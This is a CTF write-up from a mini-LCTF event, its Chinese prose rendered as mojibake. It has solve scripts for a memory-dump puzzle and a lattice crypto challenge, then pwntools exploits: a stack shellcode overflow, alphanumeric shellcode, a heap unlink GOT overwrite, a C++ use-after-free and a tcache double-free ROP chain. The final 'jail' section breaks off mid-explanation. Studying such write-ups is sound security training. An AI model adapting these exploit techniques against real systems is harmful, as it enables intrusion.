ä½†æ˜¯win7é•œåƒä¸èƒ½ç›´æ¥æŸ¥çœ‹è®°äº‹æœ¬ï¼Œäºæ˜¯ç›´æ¥å¯¼å‡ºè®°äº‹æœ¬çš„è¿›ç¨‹å†…å­˜ï¼Œstringè¿‡æ»¤ï¼Œå¾—åˆ°ä¸€å †çœ‹ä¼¼åæ ‡çš„ä¸œè¥¿ï¼Œç›²çŒœå¯ä»¥æ„é€ æˆå›¾åƒï¼Œäºæ˜¯å…¨å¯¼å‡ºæ¥å†™è„šæœ¬è§£å¯†

#### exp

```python
#!/usr/bin/python

import turtle

turtle.screensize(300, 300)

f = open("s3cR3t.txt","r")

while 1:
    i = f.readline()[7:].split(" ")
    x = int(i[0])
    y = int(i[1])
    print "position:",x,y
    turtle.goto(x,y)
    turtle.down()
    turtle.goto(x,y)
    turtle.up()
```

### MITM_0 & MITM_1 & MITM_2 | Author: eqqie

å”‰....è¿™æ˜¯æœ€å¯æƒœçš„ä¸€ä¸ªç³»åˆ—ï¼Œå¼ºç‹ç»™äº†æŒºå¤šæç¤ºï¼Œä½†æ˜¯è®¡ç½‘åŸºç¡€å¤ªå·®ç»ˆå½’æ²¡åšå‡ºç¬¬ä¸‰é¢˜ï¼Œæ·±æ„Ÿè®¡ç®—æœºæ–¹é¢åŸºç¡€çŸ¥è¯†æŒæ¡å¤ªå°‘äº†ã€‚

#### åˆ†æ

ç¬¬ä¸€é¢˜ï¼šæŸ¥çœ‹arpåŒ…å°±å¯ä»¥å¾ˆæ˜æ˜¾çœ‹åˆ°æ˜¯å“ªä¸ªIPåœ¨æ£ä¹±

ç¬¬äºŒé¢˜ï¼šè¿‡æ»¤å‡ºTLSæ¡æ‰‹åŒ…ï¼Œçœ‹çœ‹å°±å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„è‡ªç­¾è¯ä¹¦

## CRYPTO

### ill & f**k&base | Author: eqqie

è¿™ä¸¤é¢˜æœ¬è´¨æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡ç¬¬äºŒé¢˜å¥—äº†ä¸ªbrainfuck...

illç®—æ³•æ˜¯è§£é¢˜çš„é‡è¦æ€è·¯ï¼Œå¥ˆä½•çœ‹ä¸æ‡‚ï¼Œä½†æ˜¯ä¸€ç•ªæœå¯»æ‰¾åˆ°äº†ä¸ªexpï¼Œç¨å¾®æ”¹åŠ¨äº†ä¸€ä¸‹å°±å¯ä»¥æ‹¿æ¥è§£é¢˜äº†

è¯¥expéœ€è¦ä½¿ç”¨megaè¿è¡Œï¼Œä¸ºæ­¤ä¸‹äº†å¥½ä¹…çš„ç¯å¢ƒ...

#### exp

```python
#sage
from Crypto.Util.number import *
'''
'''
def GaussLatticeReduction(v1, v2):
    while True:
        if v2.norm() < v1.norm():
            v1, v2 = v2, v1
        m = round( v1*v2 / v1.norm()^2 )
        if m == 0:
            return (v1, v2)
        v2 = v2 - m*v1

'''
p=126982824744410328945797087760338772632266265605499464155168564006938381164343998332297867219509875837758518332737386292044402913405044815273140449332476472286262639891581209911570020757347401235079120185293696746139599783586620242086604902725583996821566303642800016358224555557587702599076109172899781757727
h=31497596336552470100084187834926304075869321337353584228754801815485197854209104578876574798202880445492465226847681886628987815101276129299179423009194336979092146458547058477361338454307308727787100367492619524471399054846173175096003547542362283035506046981301967777510149938655352986115892410982908002343
c=81425203325802096867547935279460713507554656326547202848965764201702208123530941439525435560101593619326780304160780819803407105746324025686271927329740552019112604285594877520543558401049557343346169993751022158349472011774064975266164948244263318723437203684336095564838792724505516573209588002889586264735
'''
'''
p=126144797452451999040656533353055522552247032483156927400829942850702503126085818799569364702233909641153270641606798547585245441691857490112991018462139784784032662291892431323682372275742064291388211916537864638144094958082303092663218585684797511816512788271536983127128482574982989855009566969252169463603
h=79073681723749844402174038746809050940767578658525858667863461520703208046517498606496755539541914689175559903369163080019747983616370381881888360250681876866576533136375365102662524613399548461942445436867220596683960606927977995785649390078898135965832217288160899978651224469973212060593835971793504106122
c=100937236170096412915841578000289968864609398878837243831166757732427810900758445108255232568792658193721448217467561463953338194033036389686696408265280746898160323186485945688275219467531750179548907072330780323097218285221388771614111285017807833235483447429699036096943350951268511484336458045609255443500
'''
f=4685394431238242086047454699939574117865082734421802876855769683954689809016908045500281898911462887906190042764753834184270447603004244910544167081517863
g=5326402554595682620065287001809742915798424911036766723537742672943459577709829465021452623299712724999868094408519004699993233519540500859134358256211397
p=172620634756442326936446284386446310176482010539257694929884002472846127607264743380697653537447369089693337723649017402105400257863085638725058903969478143249108126132543502414741890867122949021941524916405444824353100158506448429871964258931750339247018885114052623963451658829116065142400435131369957050799
c=130055004464808383851466991915980644718382040848563991873041960765504627910537316320531719771695727709826775790697704799143461018934672453482988811575574961674813001940313918329737944758875566038617074550624823884742484696611063406222986507537981571075140436761436815079809518206635499600341038593553079293254
f_inv_p=inverse(f,p)
h=f_inv_p*g%p

# Construct lattice.
v1 = vector(ZZ, [1, h])
v2 = vector(ZZ, [0, p])
m = matrix([v1,v2]);

# Solve SVP.
v1 = vector(ZZ, [1, h])
v2 = vector(ZZ, [0, p])
m = matrix([v1,v2]);
shortest_vector = m.LLL()[0]
#shortest_vector = GaussLatticeReduction(v1, v2)[0]
f, g = shortest_vector
f = -f
g = -g
print(f, g)

# Decrypt.
a = f*c % p % g
m = a * inverse_mod(f, g) % g
print(m)
print(long_to_bytes(m))
print(hex(m))
print(len(hex(m)))
```



## PWN

### hello | Author: cor1e

åˆæœ‰å †æ ˆå¯æ‰§è¡Œï¼Œåˆæœ‰è¾“å…¥é•¿åº¦é™åˆ¶ä¸å¤Ÿæ™®é€šropé“¾é•¿åº¦ï¼Œå…¸å‹é¢˜ï¼Œä¸€å¥payloadå°±è¡Œã€‚

ï¼ˆ1.è¾“å…¥ä½ç½®æ˜¯åœ¨ebp-48å¤„ï¼Œæ‰€ä»¥å¡«å……56ä½åˆ°è¿”å›åœ°å€å¤„ã€‚2.æ‰§è¡Œå®Œjmp rspåæ ˆé¡¶è·ç¦»shellcodeå‚¨å­˜å¤„ä¸º64å­—èŠ‚ï¼Œæ•…sub rsp,64ã€‚3.asmæ±‡ç¼–æ—¶è¦å…ˆæ³¨æ˜64ä½è¿˜æ˜¯32ä½ï¼ˆå³context.arch=''ï¼‰ï¼‰

exp:

```python
#!usr/bin/python3

from pwn import*

p=remote('pwn.challenge.mini.lctf.online',10050)

context.log_level='debug'
context.arch='amd64'

p.recvuntil('?')
jmp_rsp=0x4006ca #gadget


payload1=asm(shellcraft.sh())+b'A'*(56-len(asm(shellcraft.sh())))+p64(jmp_rsp)+asm('sub rsp,64;jmp rsp')
p.sendline(payload1)

p.interactive()

```



### ezsc | Author: eqqie

é¢˜é¢å¾ˆç®€å•ï¼Œè¾“å…¥çº¯å­—æ¯æ•°å­—çš„shellcodeå°±èƒ½getshellï¼Œgithubä¸Šå·²ç»æœ‰é€ å¥½çš„è½®å­ï¼Œæœç´¢alpha-shellcodeå°±å¯ä»¥æŸ¥åˆ°å¾ˆå¤šã€‚è¿™äº›è„šæœ¬å¯ä»¥æŠŠpwntoolsç”Ÿæˆçš„shellcodeè½¬æ¢ä¸ºalpha-shellcodeã€‚

ä¸‹é¢æ˜¯æ¯”èµ›æ—¶æˆ‘ç”¨çš„:

```
Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
```



### noleak | Author: eqqie

æ˜¯ä¸€é“å †é¢˜ï¼Œæˆ‘å°±çŸ¥é“å¸ˆå‚…ä»¬è¯´åªå‡ºæ ˆç›¸å…³çš„é¢˜ç›®æ˜¯éª—äººçš„...

æ£€æŸ¥äºŒè¿›åˆ¶æ–‡ä»¶å‘ç°å¯ä»¥æ”¹å†™gotè¡¨ï¼Œåœ¨IDAä¸­é€†å‘å‘ç°åœ¨0x400C9Fæœ‰ä¸€ä¸ªç™½ç»™çš„åé—¨å‡½æ•°ï¼Œäºæ˜¯çŒœæµ‹å¯èƒ½æ˜¯ä¿®æ”¹gotè¡¨è°ƒç”¨è¯¥åé—¨å‡½æ•°ã€‚

ç¨‹åºæœ¬èº«æœ‰**åˆ†é…**ã€**ç¼–è¾‘**å’Œ**é‡Šæ”¾**å †å—çš„åŠŸèƒ½ï¼Œå †å—çš„æŒ‡é’ˆå­˜æ”¾åœ¨bssæ®µï¼Œå¹¶ä¸”ä¸å­˜åœ¨æ‚¬æŒ‚æŒ‡é’ˆã€‚é‚£å°±åªèƒ½æƒ³åŠæ³•å †æº¢å‡ºæ„é€ unlinkï¼Œæ§åˆ¶bssåŒºï¼Œé—´æ¥æ§åˆ¶å †å—æŒ‡é’ˆï¼Œä»è€Œè¾¾åˆ°ä»»æ„å†™æ¥ä¿®æ”¹gotè¡¨ã€‚

æº¢å‡ºç‚¹åœ¨ç”¨ä½œè¾“å…¥çš„å‡½æ•°ï¼Œä¸ºäº†æœ«å°¾ç½®\0ï¼Œè¾“å…¥æ—¶ä¼šåš **len-1** è¿ç®—ï¼Œå¦‚æœlenä¸º0å°±ä¼šå‘ç”Ÿæ— ç¬¦å·æ•´æ•°æº¢å‡ºï¼Œå¯¼è‡´åˆ›å»ºå †å—æ—¶å¯ä»¥è¾“å…¥ä»»æ„é•¿åº¦å­—èŠ‚ã€‚

äºæ˜¯å¤§è‡´çš„å †å—åˆ†å¸ƒå°±æœ‰äº†ï¼š

```
------------------------ 0x40
ç”¨äºæ„é€ fakechunk
------------------------ 0x20 â€œmalloc(0)â€
ç”¨äºæº¢å‡ºä¿®æ”¹ä¸‹ä¸€ä¸ªå †å—
------------------------ 0x100
ä¿®æ”¹æœ¬å †å—çš„prev_sizeå’Œsizeå¹¶
é‡Šæ”¾ï¼Œé€ æˆunlink
------------------------ 0x20
ç”¨æ¥åˆ†éš”ï¼Œé˜²æ­¢åˆå¹¶æ—¶è§¦å‘å †å—å›æ”¶
è€ŒæŠ¥é”™
------------------------ top chunk
....
```

æ¥ä¸‹æ¥æ„é€ expï¼š

```python
from pwn import *

#p = process("./time")
p = remote("pwn.challenge.mini.lctf.online",10065)
elf = ELF("./time")
libc = ELF("libc.so.6")

atoi_got = elf.got[b"atoi"]
back_door = 0x400C9F

context.log_level = "debug"

def setplan(size:int,content):
    p.recvuntil(b"Your choice : ")
    p.sendline(b"1")
    p.recvuntil(b"How many minutes will it take you to finish?\n")
    p.sendline(str(size).encode())
    p.recvuntil(b"Content of the plan: ")
    p.sendline(content)
    
def edit(idx:int,size:int,content):
    p.recvuntil(b"Your choice : ")
    p.sendline(b"2")  
    p.recvuntil(b"Index : ")
    p.sendline(str(idx).encode())
    p.recvuntil(b"How many minutes will it take you to finish?\n")
    p.sendline(str(size).encode())
    p.recvuntil(b"Content of the plan: ")
    p.sendline(content)    
    
def end(idx:int):
    p.recvuntil(b"Your choice : ")
    p.sendline(b"3")  
    p.recvuntil(b"Index : ")
    p.sendline(str(idx).encode())
    
    
def exp():
    setplan(0x30,b"aaaa") #idx0
    setplan(0,b"a"*0x18) #idx1
    setplan(0xf0,b"aaaa") #idx2
    setplan(0x10,b"aaaa") #idx3
    #gdb.attach(p)
    ptr = 0x6020C0
    fd = ptr - 0x18
    bk = ptr - 0x10
    payload1 = p64(0) + p64(0x21) + p64(fd) + p64(bk) + p64(0x20) + p64(0) #fake chunk
    edit(0,0,payload1)
    payload2 = b"a"*0x10 + p64(0x50) + b"\x00"
    edit(1,0,payload2)
    end(2)
    payload3 = p64(0)*3 + p64(atoi_got)
    edit(0,0,payload3)
    #gdb.attach(p)
    edit(0,0,p64(back_door))
    
    p.sendline(b"/bin/sh")
    p.interactive()
    
if __name__ == "__main__":
    exp()
```



### easycpp | Author: eqqie

#### åˆ†æ

è¿™æ˜¯ä¸€é“c++çš„pwnï¼ŒIDAç›´æ¥F5é€†å‘å‡ºæ¥çœ‹å¾—ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œå»ºè®®ç›´æ¥çœ‹æ±‡ç¼–æ¯”è¾ƒæ˜äº†ã€‚

ä¸‹é¢æ˜¯mainå‡½æ•°ï¼š

```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  B *ptr; // eax
  B *B1; // ebx

  setvbuf(stdout, 0, 2, 0);                     // æ— ç¼“å†²
  ptr = (B *)operator new(4u);                  // å®ä¾‹åŒ–ä¸€ä¸ªBå¯¹è±¡
  B1 = ptr;
  ptr->_vptr_A = 0;
  B::B(ptr);
  operator delete(B1);
  fgets(buf, 1024, stdin);
  strdup(buf);                                  // ç”¨bufæ‰€åœ¨çš„å­—ç¬¦ä¸²å¤§å°æ¥å¼€è¾Ÿç©ºé—´
  ((void (__cdecl *)(B *))*B1->_vptr_A)(B1);
  return 0;
}
```

å¯ä»¥çœ‹åˆ°æœ€åæŠŠæŸä¸ªåœ°å€å˜æˆäº†å‡½æ•°æŒ‡é’ˆç„¶åè°ƒç”¨

B::B(void)é‡Œé¢é•¿è¿™æ ·ï¼š

```c++
void __cdecl B::B(B *const this)
{
  A::A(&this->0);
  this->_vptr_A = (int (**)(...))&off_80489E4;  // åŠ¨æ€åŠ è½½ä¸€ä¸ªåœ°å€
}
```



strdupä¼šè°ƒç”¨mallocä¸ºbufåˆ†é…å†…å­˜ï¼Œè€Œä¹‹å‰å®ä¾‹åŒ–å¯¹è±¡æ—¶ä¹Ÿä¼šåœ¨å †ä¸Šåˆ†é…å†…å­˜ï¼Œå¹¶ä¸”åœ¨è¾“å…¥å‰å°±è¢«é”€æ¯äº†ã€‚æ¨æµ‹æ˜¯UAFå¯¼è‡´äº†æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶æœ€åçš„é‚£ä¸ªåœ°å€ã€‚

è¯•ç€åŠ¨æ€è°ƒè¯•ï¼š

è¾“å…¥"aaaa\n"ï¼Œstrdupä¹‹åæ‰“æ–­ç‚¹çœ‹å †ä¹‹åå‘ç°æœç„¶æœ‰æˆ‘ä»¬çš„è¾“å…¥åœ¨å †ä¸Šï¼š

```shell
Chunk(addr=0x804fe18, size=0x10, flags=PREV_INUSE)
    [0x0804fe18     61 61 61 61 0a 00 00 00 00 00 00 00 e1 01 02 00    aaaa............]
```

äºæ˜¯æˆ‘ä»¬å¯ä»¥çœ‹çœ‹è¿™åœ°æ–¹åœ¨æ²¡è¾“å…¥ä¹‹å‰æ˜¯ä»€ä¹ˆï¼Œåœ¨B1å¯¹è±¡è¢«é”€æ¯å‰ä¸‹æ–­ç‚¹ï¼š

```shell
Chunk(addr=0x804fa10, size=0x10, flags=PREV_INUSE)
    [0x0804fa10     e4 89 04 08 00 00 00 00 00 00 00 00 e9 05 02 00    ................]
```

çœ‹åˆ°ä¸€ä¸ªåœ°å€ï¼š**0x080489e4**

æ˜¯ä¸ªåœ¨.rodataæ®µçš„åœ°å€ï¼ŒIDAä¸­çœ‹ä¸‹ï¼š

```shell
rodata:080489E4 off_80489E4     dd offset _ZN1B5printEv ; DATA XREF: B::B(void)+15â†‘o
```

åˆæ˜¯ä¸€ä¸ªåç§»ï¼Œå†è·Ÿè¿‡å»ï¼š

```shell
.text:080488F2 ; __unwind {
.text:080488F2                 push    ebp
.text:080488F3                 mov     ebp, esp
.text:080488F5                 sub     esp, 8
.text:080488F8                 sub     esp, 0Ch
.text:080488FB                 push    offset aClassB11 ; "class B11"
.text:08048900                 call    _puts
.text:08048905                 add     esp, 10h
.text:08048908                 nop
.text:08048909                 leave
.text:0804890A                 retn
.text:0804890A ; } // starts at 80488F2
```

åŸæ¥å¦‚æ­¤ï¼Œå †ä¸Šå­˜æ”¾çš„åœ°å€æ˜¯ä¸€ä¸ªäºŒçº§æŒ‡é’ˆï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨UAFçš„æ—¶å€™æ„é€ ä¸€ä¸ªäºŒçº§æŒ‡é’ˆå³å¯ã€‚å†µä¸”è¾“å…¥åŒæ—¶å­˜åœ¨äºbsså’Œå †ä¸Šï¼Œè¿™å°±æ›´æ–¹ä¾¿äº†ï¼š

#### expï¼š

```python
from pwn import *

p = remote("pwn.challenge.mini.lctf.online",10091)
elf = ELF("easycpp")
libc = ELF("libc.so.6")

context.log_level = "debug"
context.arch = "i386"

payload1 = asm(shellcraft.sh())
p.sendline(p32(0x804A0C0+4)+p32(0x80487bb))

p.interactive()
```



### heap_master | Author: eqqie

æœç„¶sadéƒ½æœ‰å›°éš¾çš„é¢˜å¯¹æˆ‘æ¥è¯´æ›´éš¾äº†ï¼Œäºæ˜¯ä¸€é¡¿ç–¯ç‹‚gooooooogleï¼ŒæŸ¥åˆ°äº†ä¸€äº›ç±»ä¼¼çš„é¢˜ï¼Œæ‰¾åˆ°äº†ç‚¹æ€è·¯ï¼Œç„¶åä¸€é¡¿çˆ†ç‚¸è°ƒè¯•æ‰è§£å†³ã€‚æœ‰ç‚¹å¯æƒœä¸€è¡€è¢«å¤–æ ¡æ‹¿äº†...

#### **é€†å‘åˆ†æ**

å¼€å±€æš´å‡»ï¼Œç”±äºä½¿ç”¨äº†æ²™ç®±æœºåˆ¶ï¼Œexecveçš„syscallè¢«ç¦ç”¨äº†ï¼Œå¯ä»¥æŸ¥çœ‹initå‡½æ•°ï¼š

```c
  v31 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);                          // æ— ç¼“å†²
  prctl(38, 1LL, 0LL, 0LL, 0LL);
  v3 = 32;
  v4 = 0;
  v5 = 0;
  v6 = 4;
  v7 = 21;
  v8 = 0;
  v9 = 4;
  v10 = -1073741762;
  v11 = 32;
  v12 = 0;
  v13 = 0;
  v14 = 0;
  v15 = 53;
  v16 = 2;
  v17 = 0;
  v18 = 0x40000000;
  v19 = '\x15';
  v20 = 1;
  v21 = 0;
  v22 = 59;
  v23 = 6;
  v24 = 0;
  v25 = 0;
  v26 = '\xFF\0\0';
  v27 = 6;
  v28 = 0;
  v29 = 0;
  v30 = 0;
  v1 = 7;
  v2 = &v3;
  prctl(22, 2LL, &v1);
  return __readfsqword(0x28u) ^ v31;
```



ç¨‹åºå¼€å§‹è®©è¾“å…¥äº†ä¸€é•¿ä¸²å†…å®¹åˆ°æ ˆä¸Šï¼Œå¹¶ä¸”æ²¡æœ‰æº¢å‡ºï¼Œäºæ˜¯æƒ³åˆ°å¯èƒ½æ˜¯è¦åœ¨æ ˆä¸Šæ„é€ ropã€‚

é™¤å»è¿™äº›ç¨‹åºçš„åŠŸèƒ½å°±æ˜¯æ™®é€šå †é¢˜çš„åŠŸèƒ½ã€‚å‡ºé¢˜äººæç¤ºè¿™é¢˜çš„ç¯å¢ƒæ­å»ºåœ¨libc2.23æˆ–libc2.27ï¼Œéœ€è¦è‡ªå·±å‘ç°ã€‚

ç»“æœæµ‹è¯•äº†ä¸€ä¸‹å‘ç°æœ‰tcache...æ˜¯åœ¨libc2.27ä¸Šï¼Œä½†æ˜¯æˆ‘ç”µè„‘é‡Œåªæœ‰ubuntu16ï¼Œäºæ˜¯èŠ±äº†åŠå¤©åœ¨ubuntu16ä¸ŠæŠ˜è…¾ã€‚å‘ç°å®åœ¨ä¸è¡Œï¼ŒåˆèŠ±äº†ä¸€å¤©é…ç½®ubuntu18çš„ç¯å¢ƒï¼Œç”¨æ‰äº†å¥½å¤šæ—¶é—´ã€‚

è™½ç„¶execveè¢«ç¦ç”¨äº†ï¼Œä½†æ˜¯openï¼Œreadï¼Œputséƒ½æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œåªéœ€è¦åœ¨æ ˆä¸Šæ„é€ ä¸€æ¡ropé“¾æ¥åˆ©ç”¨ã€‚

é‚£ä¹ˆæ—¢éœ€è¦æ³„éœ²libc_baseï¼Œåˆéœ€è¦æ³„éœ²æ ˆã€‚

æœ€ç»ˆåˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š

1. å¡«æ»¡0xa0çš„tcacheï¼Œç„¶åæ³„éœ²å‡ºunsorted_binçš„åœ°å€ä»è€Œç®—å‡ºlibc_baseï¼Œenvironï¼Œä¹‹å‰æåˆ°çš„å‡½æ•°ï¼Œä»¥åŠpop_rdiï¼Œpop_rsiï¼Œpop_rdxä¸‰ä¸ªgadgetæ¥ä¸ºå‡½æ•°ä¼ å‚ã€‚
2. åˆ©ç”¨double freeåˆ†é…ä¸€ä¸ªå †å—åˆ°bssä¸Šå­˜æ”¾chunk sizeçš„åœ°æ–¹ï¼ˆåˆ©ç”¨æŸä¸ªsizeä½œä¸ºå †å—çš„sizeåŸŸï¼‰ï¼Œå¹¶å¾€ä¸‹å¡«å……ï¼ŒæŠŠç¬¬ä¸€ä¸ªå †å—æŒ‡é’ˆè¦†ç›–ä¸ºenvironã€‚åˆ©ç”¨è¯»åŠŸèƒ½æ³„éœ²å‡ºæ ˆåœ°å€åï¼Œç»“åˆåŠ¨æ€è°ƒè¯•å¾—åˆ°çš„åç§»ï¼Œç®—å‡ºä¸€å¼€å§‹è¾“å…¥å†…å®¹çš„æ ˆåœ°å€ä»¥ä¾¿åç»­åˆ©ç”¨ã€‚
3. ç”±äºè¦æ„é€ ropï¼Œæ³„éœ²canaryå¿…ä¸å¯å°‘ï¼Œé‚£ä¹ˆä¹‹å‰ç¬¬ä¸€ä¸ªè¾“å…¥å°±å¯ä»¥ç”¨æ¥æ„é€ fakechunkï¼Œdouble freeåˆ†é…chunkåˆ°è¯¥ä½ç½®ï¼Œå¡«å……åˆ°canaryæœ€åä¸€ä½ç„¶ååˆ©ç”¨è¯»åŠŸèƒ½å°±å¯ä»¥æ³„éœ²canaryäº†ã€‚
4. é‚£ä¹ˆè¦åœ¨ä»€ä¹ˆåœ°æ–¹æ„é€ rop chainï¼Œç”±äºtcacheæœºåˆ¶æ˜¯åœ¨å¤ªå®½æ¾ï¼Œæ‰€ä»¥double freeåˆ†é…å‡ºæ¥çš„å †å—å‡ ä¹å¯ä»¥æ˜¯ä»»æ„å¤§å°ï¼Œäºæ˜¯åªè¦åœ¨æŸä¸ªå‡½æ•°çš„è¿”å›åœ°å€æ„é€ rop chainå°±å¯ä»¥æ‰§è¡Œropæ¥è¾“å‡ºflagäº†ã€‚mainå‡½æ•°ä¸å¤ªå¯è¡Œï¼Œå› ä¸ºæœ‰ä¸€ä¸ªæ­»å¾ªç¯ä¸è®©å®ƒè¿”å›ï¼Œäºæ˜¯å¯ä»¥è¯•è¯•æ§åˆ¶newå‡½æ•°çš„è¿”å›ã€‚åŠ¨æ€è°ƒè¯•æ‰¾åˆ°newåé¢æŸä¸ªä½ç½®ï¼ˆå…¶å®æŒ‰ç†æ¥è¯´æœ‰tcacheä¸ç”¨å…³å¿ƒæ„é€ fakesizeï¼Œä½†æ˜¯ä¸ºäº†é˜²æ­¢è¿™ç±»é¢˜è¢«å‡ºåœ¨libc2.23æˆ‘è¿˜æ˜¯æŒ‰ç…§è¿™ä¸ªæ€è·¯èµ°ä¸€èµ°ï¼‰ï¼Œæ„é€ rop chain+â€œflag\x00â€
5. æœ€åéšä¾¿newä¸€ä¸ªå—ï¼Œå°±å¯ä»¥æ”¶åˆ°flagäº†



#### exp: 

```python
from pwn import *

#p = remote("pwn.challenge.mini.lctf.online",10085)
p = process("./pwn")
elf = ELF("./pwn")
libc = ELF("libc.so.6")

context.log_level = "debug"

def new(size:int,content):
    p.recvuntil(b">> ")
    p.sendline(b"1")
    p.recvuntil(b"size?\n")
    p.sendline(str(size).encode())
    p.recvuntil(b"content?\n")
    p.send(content)
    
def delete(idx:int):
    p.recvuntil(b">> ")
    p.sendline(b"2")
    p.recvuntil(b"index ?\n")
    p.sendline(str(idx).encode())    
    
def write(idx:int):
    p.recvuntil(b">> ")
    p.sendline(b"3")
    p.recvuntil(b"index ?\n")
    p.sendline(str(idx).encode()) 

note_addr = 0x6020C0
notesize6_addr = 0x602058



def exp():
    pop_rdi = 0x2155f
    pop_rsi = 0x23e6a
    pop_rdx = 0x1b96
    #start at 0x7fffffffdb60
    #end at 0x7fffffffdc60
    #fakechunk at 0x7fffffffdc48
    #leave a blank(8bytes) to fix fastbin after fastbin_attack
    name = b"a"*0xE8 + p64(0) + p64(0x81) # padding + fakechunk
    p.recvuntil(b"what is your name? \n")
    p.sendline(name)
    #gdb.attach(p)
    #leak lib
    new(0x80,b"aaaaaaaa") # idx0
    new(0x80,b"aaaaaaaa") # idx1
    new(0x10,b"aaaaaaaa") # idx2
    for i in range(7):
        delete(0)
    delete(1)
    #gdb.attach(p)
    write(1)
    unsorted_arena = u64(p.recvuntil(b"\x0a",drop=True).ljust(8,b"\x00"))
    libc_base = unsorted_arena - 0x3ebca0
    environ = libc_base + 0x3ee098
    print("unsorted_arena:",hex(unsorted_arena))
    print("libc_base:",hex(libc_base))
    print("environ:",hex(environ)) # stack addr here
    
    #gadgets&rop funcs
    pop_rdi = libc_base + pop_rdi
    pop_rsi = libc_base + pop_rsi
    pop_rdx = libc_base + pop_rdx
    openat_addr = libc_base + libc.symbols[b"openat"]
    open_addr = libc_base + libc.symbols[b"open"]
    read_addr = libc_base + libc.symbols[b"read"]
    puts_addr = libc_base + libc.symbols[b"puts"]
    
    #double free& leak_stack
    new(0x78,b"split unsorted bin") #get unsorted bin idx3
    new(0x78,b"bbbbbbbb") #idx4
    delete(4)
    delete(4)
    fake_bss_chunk_addr = notesize6_addr+0x8 #user_size_start
    new(0x78,p64(fake_bss_chunk_addr)) #idx5
    new(0x78,b"bbbbbbbb") #idx6
    payload = b"a"*0x60 + p64(environ)
    new(0x78,payload) #idx7
    write(0)
    #gdb.attach(p)
    stack_leak = u64(p.recvuntil(b"\x0a",drop=True).ljust(8,b"\x00")) #0x7fffffffdd68
    fake_stack_chunk = stack_leak - 0x120
    print("stack_leak",hex(stack_leak))
    print("fake_stack_chunk",hex(fake_stack_chunk))
    
    #get stack_fake_chunk_1 & leak canary
    new(0x78,b"cccccccc") #idx8
    new(0x78,b"cccccccc") #idx9
    delete(8)
    delete(9)
    delete(8)
    #p.recv()
    new(0x78,p64(fake_stack_chunk)) #idx10
    new(0x78,b"cccccccc") #idx11
    new(0x78,b"cccccccc") #idx12
    new(0x78,b"a"*0x11) #idx13
    write(13)
    p.recv(0x11)
    canary = u64(p.recv(7).rjust(8,b"\x00")) #xxx....00
    print("canary:",hex(canary))
    #gdb.attach(p)
    
    #get stack_fake_chunk_2 & start rop
    fake_stack_chunk2 = stack_leak - 0x246

    flag_addr = fake_stack_chunk2 + 0x10 + 0x6 + 0x10 + 0x78
    rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(open_addr) #0x28
    rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr+8) + p64(pop_rdx) + p64(0x30) + p64(read_addr) #0x38
    rop += p64(pop_rdi) + p64(flag_addr+8) + p64(puts_addr) #0x18
    rop += b'flag\x00'

    print("fake_stack_chunk2:",hex(fake_stack_chunk2))
    new(0x300,b"eeeeeeee") #idx14
    delete(14)
    delete(14)
    new(0x300,p64(fake_stack_chunk2+0x10)) #idx15
    new(0x300,b"eeeeeeee") #idx16
    payload = b"a"*0x6 + p64(canary) + p64(0) + rop
    new(0x300,payload)
    
    p.interactive()
if __name__ == "__main__":
    exp()
```

æ¯”èµ›èµ¶æ—¶é—´ï¼Œexpå†™å¾—æ¯”è¾ƒä¹±ï¼Œä½†æ˜¯è¿™æ˜¯æˆ‘è®¤ä¸ºæœ€å€¼å¾—å¤ç°çš„ä¸€é“é¢˜ã€‚



### jail | Author: eqqie

#### åˆ†æ

é¢˜ç›®åŸé¢˜æ˜¯awdï¼Œçœ‹ç€æ¯”è¾ƒå¤æ‚ï¼Œå…¶å®ä¸ç„¶ï¼Œexpåˆ©ç”¨åŸç†ä¹Ÿå¾ˆ ç®€å•ï¼Œå…³é”®å°±æ˜¯ç†Ÿç»ƒä½¿ç”¨æœç´¢å¼•æ“æŸ¥æ‰¾çŸ¥è¯†ç‚¹ã€‚

è¿™æ˜¯ä¸ªchroot jailè¶Šç‹±é¢˜ï¼Œä¸åŒäºæ™®é€šçš„rootèº«ä»½è¶Šç‹±é‚£ä¹ˆç®€å•ï¼Œéœ€è¦æ‰¾åˆ°ä¸€ä¸ªå·²ç»æ‰“å¼€çš„æ–‡ä»¶æ ‡è¯†ç¬¦ï¼Œåˆšå¼€å§‹æƒ³ç ´è„‘å­ä¹Ÿæ²¡æƒ³åˆ°åœ¨å•¥ä½ç½®ã€‚åæ¥æŸ¥åˆ°forkä¹‹åå­è¿›ç¨‹ä¼šå’Œçˆ¶è¿›ç¨‹å…±äº«æ–‡ä»¶æè¿°ç¬¦ï¼ˆæœ¬æ¥æ˜¯ä¸ªç®€å•çš„çŸ¥è¯†ç‚¹ï¼Œå¥ˆä½•æˆ‘æœ‰ä¸€æ®µæ—¶é—´æ²¡çœ‹ä¹¦äº†å˜¤å˜¤å˜¤ï¼‰ã€‚

æ¢³ç†ä¸‹è¿‡ç¨‹ï¼šä¸»è¿›ç¨‹forkå‡ºä¸€ä¸ªå­è¿›ç¨‹ç„¶åç”¨ä¸€ä¸ªç®¡é“ç›‘å¬å­è¿›ç¨‹è¿”å›çš„ä¿¡æ¯ï¼Œå­è¿›ç¨‹ç”¨execveatç³»ç»Ÿè°ƒç”¨æ‰§è¡Œæˆ‘ä»¬ä¼ å…¥çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½†æ˜¯æ­¤æ—¶çš„å·¥ä½œç›®å½•å·²ç»è¢«åˆ‡æ¢åˆ°äº†/tmp/jailï¼Œåˆ‡ç”¨æˆ·ç­‰çº§érootã€‚

